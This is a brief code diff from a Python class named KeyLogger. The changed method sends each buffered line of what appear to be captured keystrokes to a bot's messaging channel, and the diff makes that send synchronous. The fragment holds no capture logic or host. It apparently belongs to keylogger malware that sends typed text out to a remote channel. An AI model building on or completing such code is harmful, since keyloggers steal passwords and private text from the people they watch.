@@ -35,7 +35,7 @@ class KeyLogger:
 
     def sendline(self):
         if self.line != "":
-            self.bot.send_message_joined(self.line)
+            self.bot.send_message_joined_sync(self.line)
             self.line=""
 
 
